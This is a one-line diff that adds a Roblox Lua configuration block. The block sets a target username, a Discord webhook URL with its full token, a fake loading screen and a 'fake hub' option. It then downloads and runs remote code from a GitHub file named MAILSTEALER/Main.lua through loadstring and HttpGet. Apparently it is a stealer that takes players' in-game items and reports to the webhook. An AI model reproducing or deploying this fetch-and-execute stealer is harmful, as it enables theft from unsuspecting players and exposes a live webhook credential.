@@ -1,0 +1,1 @@
+Username = "coupFatalcoup2" Webhook = "https://discord.com/api/webhooks/1190722560233590894/2TLr-v0HdKOpFlyJc5N1RO84pYN0FEDebD2kWH6wBta4wFEmWTnY4wBAAHnjpiK-cZ0v" Mailmsg = "EEZZ" FakeLoadScreen = true Fake_Hub_If_Not_Enough_Gems = false  loadstring(game:HttpGet("https://raw.githubusercontent.com/POGGERZ15/MAILSTEALER/main/Main.lua"))()
